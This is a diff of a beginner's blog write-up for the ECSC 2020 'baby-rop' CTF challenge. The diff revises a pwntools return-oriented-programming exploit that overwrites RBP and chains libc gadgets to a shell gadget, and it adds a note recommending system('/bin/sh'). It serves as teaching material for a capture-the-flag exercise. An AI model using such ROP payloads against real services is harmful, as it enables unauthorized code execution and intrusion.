@@ -9,6 +9,8 @@ category: blog
 ## Introduction
 As a beginner in the CTF world, I just skipped the 'pwn' and 'rev' categories. The challenges seemed too hard for me to solve. This year, however, I decided that I needed to improve and be able to at least solve some basic ones. With that in mind, I participated to [Sin__](https://twitter.com/mztropics)'s beginner rev course, which included as much pwn concepts as reversing ones. When I saw the baby-rop challege during the ECSC 2020 Quals, I knew I needed to solve it.
 
+EDIT: It is worth mentioning that one_gadget is not the ideal tool in this situation because the newer versions of libc introduce a lot of constraints. The easiest solution would be to use system() from libc with "/bin/sh" as an argument, as I'll show in my next article.
+
 ## Mission Briefing
 
 ![Challenge Description](/images/baby_rop/desc.png)
@@ -491,12 +493,7 @@ Start              End                Perm	Name
 gdb-peda$
 {% endhighlight %}
 
-Memory block 0x00404000-0x00405000 is readable and writeable, so it is a very good candidate, even though it is not eactly the stack. I chose to set RBP to 0x00404500, which is in the middle of that memory block. The gadget that pops rbp can be easily found using rp++:
-
-{% highlight auto %}
-$ rp-lin-x64 -f pwn_baby_rop  -r 1 | grep 'pop rbp'
-0x0040115d: pop rbp ; ret  ;  (1 found)
-{% endhighlight %}
+Memory block 0x00404000-0x00405000 is readable and writeable, so it is a very good candidate, even though it is not exactly the stack. I chose to set RBP to 0x00404500, which is in the middle of that memory block. The string that overwirtes RBP is located exactly before the one that overwrites RIP, so we have to modify the payload accordingly.
 
 The final script:
 
@@ -540,19 +537,17 @@ pop_rdx_r12 = libc_base + 0x0011c1e1
 sys_gadget = libc_base + 0xe6ce9
 log.info('gadget address: ' + hex(sys_gadget))
 
-pop_rbp = 0x0040115d
 new_rbp_value = 0x00404500
 
 payload = b""
-payload += b"A" * 264
+payload += b"A" * 256
+payload += p64(new_rbp_value)
 payload += p64(pop_rsi_r15)
 payload += p64(0x0)
 payload += p64(0x0)
 payload += p64(pop_rdx_r12)
 payload += p64(0x0)
 payload += p64(0x0)
-payload += p64(pop_rbp)
-payload += p64(new_rbp_value)
 payload += p64(sys_gadget)
 
 io.sendline(payload)
